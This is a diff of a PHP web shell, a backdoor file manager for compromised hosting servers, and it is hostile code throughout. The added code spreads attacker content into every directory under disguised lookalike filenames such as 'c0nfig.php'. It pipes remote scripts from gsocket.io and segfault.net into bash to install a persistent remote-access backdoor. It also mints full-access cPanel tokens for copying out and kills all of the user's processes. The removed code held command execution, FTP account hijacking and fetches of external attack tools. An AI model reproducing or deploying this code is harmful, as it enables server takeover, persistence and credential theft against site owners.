-    return ['success' => false, 'message' => 'Select a file first'];
-}
-
-function changeDirectory($path) {
-    if ($path === '..') {
-        @chdir('..');
-    } else {
-        @chdir($path);
-    }
-}
-
-function getCurrentDirectory() {
-    return realpath(getcwd());
-}
-
-function changePermission($path) {
-    if (!file_exists($path)) return ['success' => false, 'message' => 'Not found'];
-    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
-    if ($permission === '') return ['success' => false, 'message' => 'Invalid permission'];
-    $parsedPermission = intval($permission, 8);
-    if ($parsedPermission === 0) return ['success' => false, 'message' => 'Invalid permission'];
-    if (@chmod($path, $parsedPermission)) {
-        return ['success' => true, 'message' => 'Permission changed'];
-    }
-    return ['success' => false, 'message' => 'Failed to change permission'];
-}
-
-function renameFile($oldName, $newName) {
-    if (file_exists($oldName)) {
-        $directory = dirname($oldName);
-        $newPath = $directory . '/' . $newName;
-        if (@rename($oldName, $newPath)) {
-            return ['success' => true, 'message' => 'Renamed successfully'];
-        }
-        return ['success' => false, 'message' => 'Rename failed'];
-    }
-    return ['success' => false, 'message' => 'Not found'];
-}
-
-function deleteFile($file) {
-    if (is_file($file)) {
-        if (@unlink($file)) return ['success' => true, 'message' => 'File deleted'];
-        return ['success' => false, 'message' => 'Delete failed'];
-    }
-    return ['success' => false, 'message' => 'Not found'];
-}
-
-function deleteFolder($folder) {
-    if (is_dir($folder)) {
-        $files = @glob($folder . '/*');
-        foreach ($files as $file) {
-            is_dir($file) ? deleteFolder($file) : @unlink($file);
-        }
-        if (@rmdir($folder)) return ['success' => true, 'message' => 'Folder deleted'];
-        return ['success' => false, 'message' => 'Delete failed'];
-    }
-    return ['success' => false, 'message' => 'Not found'];
-}
-
-function scanDeepestDirectory($basePath) {
-    $deepest = ['path' => $basePath, 'depth' => 0];
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
-    foreach ($iterator as $item) {
-        if ($item->isDir()) {
-            $depth = $iterator->getDepth() + 1;
-            if ($depth > $deepest['depth']) {
-                $deepest = ['path' => $item->getPathname(), 'depth' => $depth];
-            }
-        }
-    }
-    return $deepest;
-}
-
-function scanNewlyFiles($basePath, $extension = 'php', $limit = 50) {
-    $files = [];
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::LEAVES_ONLY
-    );
-    foreach ($iterator as $item) {
-        if ($item->isFile()) {
-            $ext = strtolower(pathinfo($item->getFilename(), PATHINFO_EXTENSION));
-            if ($ext === $extension) {
-                $files[] = [
-                    'path' => $item->getPathname(),
-                    'modified' => $item->getMTime()
-                ];
-            }
-        }
-    }
-    usort($files, function($a, $b) {
-        return $b['modified'] - $a['modified'];
-    });
-    return array_slice($files, 0, $limit);
-}
-
-function remoteUpload($url, $filename, $targetDir) {
-    $content = @file_get_contents($url);
-    if ($content === false) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-        $content = curl_exec($ch);
-        curl_close($ch);
-    }
-    if ($content === false || empty($content)) {
-        return ['success' => false, 'message' => 'Failed to download from URL'];
-    }
-    $targetPath = rtrim($targetDir, '/') . '/' . $filename;
-    if (@file_put_contents($targetPath, $content) !== false) {
-        return ['success' => true, 'message' => 'Remote file downloaded: ' . $filename];
-    }
-    return ['success' => false, 'message' => 'Failed to save file'];
+    return '';
 }
 
 function uploadMultipleFiles($targetDirectory) {
-    $results = [];
-    if (isset($_FILES['files']) && is_array($_FILES['files']['name'])) {
-        $count = count($_FILES['files']['name']);
-        for ($i = 0; $i < $count; $i++) {
-            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK && $_FILES['files']['size'][$i] > 0) {
-                $targetFile = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
-                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $targetFile)) {
-                    $results[] = basename($_FILES['files']['name'][$i]);
-                }
+    if (!isset($_FILES['files'])) return 'No files selected.';
+    fixPermission($targetDirectory);
+    $success = 0; $fail = 0;
+    for ($i = 0; $i < count($_FILES['files']['name']); $i++) {
+        if ($_FILES['files']['error'][$i] === 0 && !empty($_FILES['files']['name'][$i])) {
+            $target = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
+            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) $success++;
+            else $fail++;
+        }
+    }
+    return "Uploaded: $success, Failed: $fail";
+}
+
+function getCurrentDirectory() { return realpath(getcwd()); }
+
+function deleteFile($file) {
+    fixPermission($file);
+    fixPermission(dirname($file));
+    if (file_exists($file)) {
+        if (is_dir($file)) return deleteFolder($file);
+        if (@unlink($file)) return true;
+    }
+    return false;
+}
+
+function deleteFolder($folder) {
+    fixPermission($folder);
+    if (is_dir($folder)) {
+        $items = @scandir($folder);
+        if (is_array($items)) {
+            foreach ($items as $item) {
+                if ($item == '.' || $item == '..') continue;
+                $path = $folder . '/' . $item;
+                fixPermission($path);
+                if (is_dir($path)) deleteFolder($path);
+                else @unlink($path);
+            }
+        }
+        return @rmdir($folder);
+    }
+    return false;
+}
+
+function renameFile($oldName, $newName) {
+    fixPermission($oldName);
+    fixPermission(dirname($oldName));
+    if (file_exists($oldName)) {
+        $directory = dirname($oldName);
+        $newPath = $directory . '/' . $newName;
+        if (@rename($oldName, $newPath)) return 'Renamed successfully.';
+        return 'Error renaming.';
+    }
+    return 'File does not exist.';
+}
+
+function scanDeepestDirectory($basePath) {
+    $deepest = []; $maxDepth = 0;
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach ($iterator as $item) {
+            if ($item->isDir()) {
+                $depth = $iterator->getDepth();
+                if ($depth > $maxDepth) { $maxDepth = $depth; $deepest = [$item->getPathname()]; }
+                elseif ($depth == $maxDepth) { $deepest[] = $item->getPathname(); }
+            }
+        }
+    } catch (Exception $e) {}
+    return $deepest;
+}
+
+function scanNewlyFiles($basePath, $ext = 'php', $limit = 50) {
+    $files = [];
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS)
+        );
+        foreach ($iterator as $item) {
+            if ($item->isFile() && strtolower($item->getExtension()) === $ext) {
+                $files[] = ['path' => $item->getPathname(), 'time' => $item->getMTime()];
+            }
+        }
+    } catch (Exception $e) {}
+    usort($files, function($a, $b) { return $b['time'] - $a['time']; });
+    return array_slice($files, 0, $limit);
+}
+
+function generateHomoglyph($filename) {
+    $name = pathinfo($filename, PATHINFO_FILENAME);
+    $ext = pathinfo($filename, PATHINFO_EXTENSION);
+    $map = [
+        'a' => ['@','4'],
+        'e' => ['3'],
+        'i' => ['1','l'],
+        'o' => ['0'],
+        's' => ['5'],
+        'l' => ['1','I'],
+        'g' => ['9'],
+        'c' => ['('],
+        't' => ['7'],
+        'I' => ['l','1'],
+        'O' => ['0'],
+        'S' => ['5'],
+        'A' => ['4','@'],
+        'E' => ['3'],
+        'B' => ['8'],
+        'G' => ['6'],
+        'T' => ['7'],
+    ];
+    $variants = [];
+    $len = strlen($name);
+    for ($i = 0; $i < $len; $i++) {
+        $ch = $name[$i];
+        if (isset($map[$ch])) {
+            foreach ($map[$ch] as $rep) {
+                $v = substr($name, 0, $i) . $rep . substr($name, $i + 1);
+                $full = $ext ? $v . '.' . $ext : $v;
+                if ($full !== $filename) $variants[] = $full;
             }
         }
     }
-    if (count($results) > 0) {
-        return ['success' => true, 'message' => count($results) . ' files uploaded: ' . implode(', ', $results)];
+    if (empty($variants)) {
+        $variants[] = '.' . $filename;
+        $variants[] = $name . '_bak.' . $ext;
     }
-    return ['success' => false, 'message' => 'No files uploaded'];
+    return array_unique($variants);
 }
 
-function getFileIcon($type, $name) {
-    if ($type === 'Folder') {
-        return '<svg class="file-icon folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/></svg>';
+function massSpreadAuto($basePath, $content) {
+    $count = 0; $errors = []; $created = [];
+    $targetExts = ['php'];
+    try {
+        fixPermission($basePath);
+        $dirs = [$basePath];
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach ($iterator as $item) {
+            if ($item->isDir()) $dirs[] = $item->getPathname();
+        }
+        foreach ($dirs as $dir) {
+            fixPermission($dir);
+            $files = @scandir($dir);
+            if (!is_array($files)) { $errors[] = $dir; continue; }
+            $existingFiles = [];
+            foreach ($files as $f) {
+                if ($f === '.' || $f === '..') continue;
+                if (is_file($dir . '/' . $f)) {
+                    $fext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
+                    if (in_array($fext, $targetExts)) $existingFiles[] = $f;
+                }
+            }
+            if (empty($existingFiles)) {
+                $existingFiles = ['index.php', 'config.php', 'class-loader.php'];
+            }
+            $placed = false;
+            foreach ($existingFiles as $origFile) {
+                $variants = generateHomoglyph($origFile);
+                foreach ($variants as $variant) {
+                    $targetPath = $dir . '/' . $variant;
+                    if (!file_exists($targetPath)) {
+                        if (@file_put_contents($targetPath, $content) !== false) {
+                            $count++;
+                            $created[] = $targetPath;
+                            $placed = true;
+                            break 2;
+                        }
+                    }
+                }
+            }
+            if (!$placed) $errors[] = $dir;
+        }
+    } catch (Exception $e) {
+        $errors[] = 'Exception: ' . $e->getMessage();
     }
-    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
-    $codeExts = ['php', 'js', 'ts', 'jsx', 'tsx', 'py', 'rb', 'java', 'c', 'cpp', 'h', 'css', 'scss', 'html', 'xml', 'json', 'sql'];
-    $imageExts = ['jpg', 'jpeg', 'png', 'gif', 'svg', 'webp', 'ico', 'bmp'];
-    $archiveExts = ['zip', 'rar', 'tar', 'gz', '7z'];
-    
-    if (in_array($ext, $codeExts)) {
-        return '<svg class="file-icon code" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>';
-    } elseif (in_array($ext, $imageExts)) {
-        return '<svg class="file-icon image" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg>';
-    } elseif (in_array($ext, $archiveExts)) {
-        return '<svg class="file-icon archive" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 8V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v3"/><path d="M21 16v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-3"/><path d="M4 12H2"/><path d="M10 12H8"/><path d="M16 12h-2"/><path d="M22 12h-2"/></svg>';
-    }
-    return '<svg class="file-icon file" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/></svg>';
+    return ['count' => $count, 'errors' => $errors, 'created' => $created];
 }
 
+
+
+// === HANDLE REQUESTS ===
 $currentDirectory = getCurrentDirectory();
-$responseMessage = null;
+$errorMessage = '';
+$responseMessage = '';
 $cmdOutput = '';
+$loginError = '';
 
-if (isAuthenticated()) {
-    if (isset($_GET['nomi'])) {
-        changeDirectory($_GET['nomi']);
-        $currentDirectory = getCurrentDirectory();
-    }
-    
-    if (isset($_GET['edit'])) {
-        $file = $_GET['edit'];
-        $content = readFileContent($file);
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
-            $saved = saveFileContent($file);
-            $responseMessage = $saved 
-                ? ['success' => true, 'message' => 'File saved']
-                : ['success' => false, 'message' => 'Save failed'];
+if (isset($_GET['lph'])) {
+    @chdir($_GET['lph']);
+    $currentDirectory = getCurrentDirectory();
+}
+
+if (isset($_POST['multi_upload'])) {
+    $responseMessage = uploadMultipleFiles($currentDirectory);
+}
+
+if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
+    $newDir = $currentDirectory . '/' . $_POST['foldername'];
+    fixPermission($currentDirectory);
+    if (@mkdir($newDir, 0755)) $responseMessage = 'Folder created.';
+    else $responseMessage = 'Failed to create folder.';
+}
+
+if (isset($_POST['mass_chmod']) && !empty($_POST['chmod_folder']) && !empty($_POST['chmod_file'])) {
+    $folderPerm = $_POST['chmod_folder'];
+    $filePerm = $_POST['chmod_file'];
+    $targetPath = !empty($_POST['chmod_path']) ? $_POST['chmod_path'] : $currentDirectory;
+    $folderCount = 0; $fileCount = 0; $chmodErrors = [];
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach ($iterator as $item) {
+            $path = $item->getPathname();
+            if ($item->isDir()) {
+                if (@chmod($path, octdec($folderPerm))) $folderCount++;
+                else $chmodErrors[] = $path;
+            } else {
+                if (@chmod($path, octdec($filePerm))) $fileCount++;
+                else $chmodErrors[] = $path;
+            }
         }
-    }
-    
-    if (isset($_GET['chmod']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
-        $responseMessage = changePermission($_GET['chmod']);
-    }
-    
-    if (isset($_POST['upload'])) {
-        $responseMessage = uploadFile($currentDirectory);
-    }
-    
-    if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
-        $cmdOutput = executeCommand($_POST['cmd']);
-    }
-    
-    if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
-        $responseMessage = renameFile($_GET['rename'], $_POST['new_name']);
-    }
-    
-    if (isset($_GET['delete'])) {
-        $file = $_GET['delete'];
-        $fileDirectory = dirname($file);
-        if (is_file($file)) {
-            $responseMessage = deleteFile($file);
-        } elseif (is_dir($file)) {
-            $responseMessage = deleteFolder($file);
+        @chmod($targetPath, octdec($folderPerm));
+        $folderCount++;
+        $cmdOutput = "=== Mass Chmod Result ===\nTarget: $targetPath\nFolder Perm: $folderPerm\nFile Perm: $filePerm\n---\nFolders: $folderCount\nFiles: $fileCount";
+        if (count($chmodErrors) > 0) {
+            $cmdOutput .= "\nErrors: " . count($chmodErrors);
+            foreach (array_slice($chmodErrors, 0, 5) as $err) $cmdOutput .= "\n  $err";
         }
-        if ($responseMessage && $responseMessage['success']) {
-            echo "<script>window.location='?nomi=" . urlencode($fileDirectory) . "';</script>";
-            exit;
-        }
+        $responseMessage = 'Mass chmod completed.';
+    } catch (Exception $e) {
+        $cmdOutput = "Error: " . $e->getMessage();
     }
-    
-    if (isset($_POST['Summon'])) {
-        $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
-        $filePath = $currentDirectory . '/Adminer.php';
-        $fileContent = @file_get_contents($baseUrl);
-        if ($fileContent !== false && @file_put_contents($filePath, $fileContent) !== false) {
-            $responseMessage = ['success' => true, 'message' => 'Adminer downloaded'];
+}
+
+if (isset($_POST['mass_spread']) && !empty($_POST['spread_content'])) {
+    $spreadContent = $_POST['spread_content'];
+    $result = massSpreadAuto($currentDirectory, $spreadContent);
+    $cmdOutput = "=== Mass Spread Result ===\nStarting from: $currentDirectory\nFiles created: " . $result['count'];
+    if (count($result['created']) > 0) {
+        $cmdOutput .= "\n\nCreated files:";
+        foreach (array_slice($result['created'], 0, 20) as $c) $cmdOutput .= "\n  " . basename($c) . " -> " . dirname($c);
+    }
+    if (count($result['errors']) > 0) {
+        $cmdOutput .= "\n\nFailed dirs: " . count($result['errors']);
+        foreach (array_slice($result['errors'], 0, 5) as $err) $cmdOutput .= "\n  $err";
+    }
+    $responseMessage = 'Mass spread completed: ' . $result['count'] . ' files created.';
+}
+
+if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
+    $gsCmd = $_POST['gsocket_cmd'];
+    $cmdOutput = "=== GSSocket ===\n\n";
+
+    if ($gsCmd === 'install') {
+        // Step 1: try gsocket.io
+        $out = runCmd('curl -fsSL https://gsocket.io/y | bash');
+        if (!empty(trim($out ?? ''))) {
+            $cmdOutput .= "[1] gsocket.io (curl):\n" . $out;
         } else {
-            $responseMessage = ['success' => false, 'message' => 'Download failed'];
+            $out = runCmd('wget --no-verbose -O- https://gsocket.io/y | bash');
+            if (!empty(trim($out ?? ''))) {
+                $cmdOutput .= "[1] gsocket.io (wget):\n" . $out;
+            } else {
+                $cmdOutput .= "[1] gsocket.io: No output.\n";
+            }
         }
-    }
-    
-    if (isset($_POST['wordpress_tool'])) {
-        $wpUrl = 'https://raw.githubusercontent.com/eclibesec/hastalavista/refs/heads/main/xt-wp.php';
-        $wpFilePath = $currentDirectory . '/xt-wp.php';
-        $wpContent = @file_get_contents($wpUrl);
-        if ($wpContent !== false && @file_put_contents($wpFilePath, $wpContent) !== false) {
-            echo "<script>window.location='" . basename($wpFilePath) . "';</script>";
-            exit;
+        // Step 2: fallback segfault.net
+        $out2 = runCmd('curl -fsSL http://nossl.segfault.net/deploy-all.sh -o /tmp/deploy-all.sh && bash /tmp/deploy-all.sh');
+        if (!empty(trim($out2 ?? ''))) {
+            $cmdOutput .= "\n\n[2] segfault.net deploy:\n" . $out2;
         } else {
-            $responseMessage = ['success' => false, 'message' => 'WordPress tool download failed'];
+            $cmdOutput .= "\n\n[2] segfault.net deploy: No output.";
         }
+        // Step 3: fallback port 53
+        $out3 = runCmd('GS_PORT=53 bash /tmp/deploy-all.sh');
+        if (!empty(trim($out3 ?? ''))) {
+            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy:\n" . $out3;
+        } else {
+            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy: No output.";
+        }
+        // Cleanup
+        @unlink('/tmp/deploy-all.sh');
+        runCmd('rm -f /tmp/deploy-all.sh');
+        $responseMessage = 'GSSocket install chain executed.';
+
+    } elseif ($gsCmd === 'uninstall') {
+        $out = runCmd('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
+        if (empty(trim($out ?? ''))) {
+            $out = runCmd('GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1');
+        }
+        // Auto kill all user processes
+        runCmd('pkill -u $(whoami) 2>/dev/null');
+        runCmd('rm -f /tmp/deploy-all.sh');
+        // Clean output - remove the "Use pkill" instruction line
+        $out = preg_replace('/-->.*pkill defunct.*/i', '', $out ?? '');
+        $out = trim($out);
+        $out .= "\nAll user processes killed.";
+        $cmdOutput .= $out;
+        $responseMessage = 'GSSocket uninstall executed.';
     }
-    
-    if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
-        $gsocketCommands = [
-            'install_curl' => 'bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1',
-            'install_wget' => 'bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1',
-            'uninstall_curl' => 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1; pkill defunct 2>&1',
-            'uninstall_wget' => 'GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1; pkill defunct 2>&1'
-        ];
-        $cmd = $_POST['gsocket_cmd'];
-        if (isset($gsocketCommands[$cmd])) {
-            $cmdOutput = @shell_exec($gsocketCommands[$cmd]);
-            $responseMessage = ['success' => true, 'message' => 'GSocket command executed. Check output below.'];
-        }
+}
+
+if (isset($_POST['cpanel_token'])) {
+    $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
+    $uapiOutput = runUapi('Tokens create_full_access name=' . $randomName);
+    $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
+    $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
+    $serverDomain = rtrim($serverDomain, '/');
+    $serverUser = trim(runCmd('whoami') ?? get_current_user());
+    $token = '';
+    if ($uapiOutput && preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $m)) {
+        $token = $m[1];
     }
-    
-    if (isset($_POST['cpanel_token'])) {
-        $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
-        $uapiOutput = @shell_exec('uapi Tokens create_full_access name=' . $randomName . ' 2>&1');
-        
-        $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
-        $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
-        $serverDomain = rtrim($serverDomain, '/');
-        
-        $serverUser = get_current_user();
-        
-        $token = 'Failed to generate';
-        
-        if (preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $matches)) {
-            $token = $matches[1];
-        }
-        
-        $cmdOutput = "=== cPanel Token Generated ===\n\n";
+    $cmdOutput = "=== cPanel Token Generated ===\n\n";
+    if (!empty($token)) {
+        $cmdOutput .= "Login   : https://" . $serverDomain . ":2083/\n";
         $cmdOutput .= "Domain  : " . $serverDomain . "\n";
         $cmdOutput .= "User    : " . $serverUser . "\n";
         $cmdOutput .= "Token   : " . $token . "\n";
         $cmdOutput .= "\n=== Copy Format ===\n";
         $cmdOutput .= $serverDomain . "|" . $serverUser . "|" . $token;
-        
-        $responseMessage = ['success' => true, 'message' => 'cPanel token generated successfully'];
-    }
-    
-    if (isset($_POST['ftp_list'])) {
-        $ftpOutput = @shell_exec('uapi --output=json Ftp list_ftp 2>&1');
-        $ftpData = @json_decode($ftpOutput, true);
-        
-        $cmdOutput = "=== FTP Accounts List ===\n\n";
-        if ($ftpData && isset($ftpData['result']['data']) && is_array($ftpData['result']['data'])) {
-            foreach ($ftpData['result']['data'] as $ftp) {
-                $cmdOutput .= "User   : " . ($ftp['user'] ?? 'N/A') . "\n";
-                $cmdOutput .= "Domain : " . ($ftp['domain'] ?? 'N/A') . "\n";
-                $cmdOutput .= "Dir    : " . ($ftp['homedir'] ?? 'N/A') . "\n";
-                $cmdOutput .= "---\n";
-            }
-        } else {
-            $cmdOutput .= "No FTP accounts found or failed to retrieve.\n";
-        }
-        $responseMessage = ['success' => true, 'message' => 'FTP list retrieved'];
-    }
-    
-    if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
-        $ftpUser = $_POST['ftp_user'];
-        $ftpPass = $_POST['ftp_pass'];
-        $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
-        
-        $homeDir = @shell_exec('echo $HOME 2>&1');
-        $homeDir = trim($homeDir);
-        if (empty($homeDir)) {
-            $homeDir = '/home/' . get_current_user();
-        }
-        
-        $addCmd = "uapi --output=json Ftp add_ftp user=" . escapeshellarg($ftpUser) . " pass=" . escapeshellarg($ftpPass) . " quota=" . escapeshellarg($ftpQuota) . " homedir=" . escapeshellarg($homeDir) . " 2>&1";
-        $addOutput = @shell_exec($addCmd);
-        $addData = @json_decode($addOutput, true);
-        
-        $cmdOutput = "=== FTP Account Creation ===\n\n";
-        if ($addData && isset($addData['result']['status']) && $addData['result']['status'] == 1) {
-            $cmdOutput .= "Status  : SUCCESS\n";
-            $cmdOutput .= "User    : " . $ftpUser . "\n";
-            $cmdOutput .= "Pass    : " . $ftpPass . "\n";
-            $cmdOutput .= "Dir     : " . $homeDir . "\n";
-            $responseMessage = ['success' => true, 'message' => 'FTP account created successfully'];
-        } else {
-            $error = $addData['result']['errors'][0] ?? 'Unknown error';
-            $cmdOutput .= "Status  : FAILED\n";
-            $cmdOutput .= "Error   : " . $error . "\n";
-            $responseMessage = ['success' => false, 'message' => 'FTP creation failed'];
-        }
-    }
-    
-    if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
-        $chgUser = $_POST['ftp_chg_user'];
-        $chgPass = $_POST['ftp_chg_pass'];
-        $chgDomain = $_POST['ftp_chg_domain'];
-        
-        $passwdCmd = "uapi --output=json Ftp passwd user=" . escapeshellarg($chgUser) . " domain=" . escapeshellarg($chgDomain) . " pass=" . escapeshellarg($chgPass) . " 2>&1";
-        $passwdOutput = @shell_exec($passwdCmd);
-        $passwdData = @json_decode($passwdOutput, true);
-        
-        $cmdOutput = "=== FTP Password Change ===\n\n";
-        if ($passwdData && isset($passwdData['result']['status']) && $passwdData['result']['status'] == 1) {
-            $cmdOutput .= "Status  : SUCCESS\n";
-            $cmdOutput .= "User    : " . $chgUser . "\n";
-            $cmdOutput .= "Domain  : " . $chgDomain . "\n";
-            $cmdOutput .= "NewPass : " . $chgPass . "\n";
-            $responseMessage = ['success' => true, 'message' => 'FTP password changed'];
-        } else {
-            $error = $passwdData['result']['errors'][0] ?? 'Unknown error';
-            $cmdOutput .= "Status  : FAILED\n";
-            $cmdOutput .= "Error   : " . $error . "\n";
-            $responseMessage = ['success' => false, 'message' => 'Password change failed'];
-        }
-    }
-    
-    if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
-        $delUser = $_POST['ftp_del_user'];
-        $delDomain = $_POST['ftp_del_domain'];
-        
-        $delCmd = "uapi --output=json Ftp delete_ftp user=" . escapeshellarg($delUser) . " domain=" . escapeshellarg($delDomain) . " 2>&1";
-        $delOutput = @shell_exec($delCmd);
-        $delData = @json_decode($delOutput, true);
-        
-        $cmdOutput = "=== FTP Account Deletion ===\n\n";
-        if ($delData && isset($delData['result']['status']) && $delData['result']['status'] == 1) {
-            $cmdOutput .= "Status  : SUCCESS\n";
-            $cmdOutput .= "Deleted : " . $delUser . "@" . $delDomain . "\n";
-            $responseMessage = ['success' => true, 'message' => 'FTP account deleted'];
-        } else {
-            $error = $delData['result']['errors'][0] ?? 'Unknown error';
-            $cmdOutput .= "Status  : FAILED\n";
-            $cmdOutput .= "Error   : " . $error . "\n";
-            $responseMessage = ['success' => false, 'message' => 'FTP deletion failed'];
-        }
-    }
-    
-    if (isset($_POST['newfile']) && !empty($_POST['filename'])) {
-        $newFilePath = $currentDirectory . '/' . $_POST['filename'];
-        if (@file_put_contents($newFilePath, '') !== false) {
-            $responseMessage = ['success' => true, 'message' => 'File created'];
-        } else {
-            $responseMessage = ['success' => false, 'message' => 'Create failed'];
-        }
-    }
-    
-    if (isset($_POST['scan_deep'])) {
-        try {
-            $result = scanDeepestDirectory($currentDirectory);
-            $cmdOutput = "=== Deepest Directory Scan ===\n\n";
-            $cmdOutput .= "Base Path : " . $currentDirectory . "\n";
-            $cmdOutput .= "Deepest   : " . $result['path'] . "\n";
-            $cmdOutput .= "Depth     : " . $result['depth'] . " levels\n";
-            $responseMessage = ['success' => true, 'message' => 'Scan completed'];
-        } catch (Exception $e) {
-            $cmdOutput = "Error: " . $e->getMessage();
-            $responseMessage = ['success' => false, 'message' => 'Scan failed'];
-        }
-    }
-    
-    if (isset($_POST['scan_newly'])) {
-        try {
-            $ext = !empty($_POST['scan_ext']) ? $_POST['scan_ext'] : 'php';
-            $files = scanNewlyFiles($currentDirectory, $ext, 30);
-            $cmdOutput = "=== Newly Modified Files (." . $ext . ") ===\n\n";
-            foreach ($files as $file) {
-                $cmdOutput .= date('Y-m-d H:i:s', $file['modified']) . " | " . $file['path'] . "\n";
-            }
-            if (empty($files)) {
-                $cmdOutput .= "No files found.\n";
-            }
-            $responseMessage = ['success' => true, 'message' => count($files) . ' files found'];
-        } catch (Exception $e) {
-            $cmdOutput = "Error: " . $e->getMessage();
-            $responseMessage = ['success' => false, 'message' => 'Scan failed'];
-        }
-    }
-    
-    if (isset($_POST['remote_upload']) && !empty($_POST['remote_url']) && !empty($_POST['remote_filename'])) {
-        $result = remoteUpload($_POST['remote_url'], $_POST['remote_filename'], $currentDirectory);
-        $responseMessage = $result;
-        if ($result['success']) {
-            $cmdOutput = "=== Remote Upload Success ===\n\n";
-            $cmdOutput .= "URL  : " . $_POST['remote_url'] . "\n";
-            $cmdOutput .= "File : " . $_POST['remote_filename'] . "\n";
-            $cmdOutput .= "Path : " . $currentDirectory . "/" . $_POST['remote_filename'] . "\n";
-        }
-    }
-    
-    if (isset($_POST['multi_upload'])) {
-        $result = uploadMultipleFiles($currentDirectory);
-        $responseMessage = $result;
-    }
-    
-    if (isset($_POST['mass_chmod']) && !empty($_POST['chmod_folder']) && !empty($_POST['chmod_file'])) {
-        $folderPerm = $_POST['chmod_folder'];
-        $filePerm = $_POST['chmod_file'];
-        $targetPath = !empty($_POST['chmod_path']) ? $_POST['chmod_path'] : $currentDirectory;
-        
-        $folderCount = 0;
-        $fileCount = 0;
-        $errors = [];
-        
-        try {
-            $iterator = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
-                RecursiveIteratorIterator::SELF_FIRST
-            );
-            
-            foreach ($iterator as $item) {
-                $path = $item->getPathname();
-                if ($item->isDir()) {
-                    if (@chmod($path, octdec($folderPerm))) {
-                        $folderCount++;
